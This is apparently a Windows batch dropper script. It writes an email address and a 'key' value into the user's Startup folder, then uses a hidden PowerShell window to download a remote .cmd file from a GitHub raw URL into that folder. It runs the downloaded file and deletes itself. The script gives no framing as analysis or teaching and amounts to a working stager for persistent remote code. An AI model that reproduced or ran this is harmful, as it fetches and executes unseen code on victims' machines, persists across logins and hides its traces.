@echo off
set "email=example@gmail.com"
set "eword=key"
set "var=%cd%"
set "startup=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %startup%
echo %email% > email.txt
echo %eword% > eword.txt
powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/goget.cmd -OutFile goget.cmd"
powershell ./goget.cmd
cd %var%
del initial.cmd
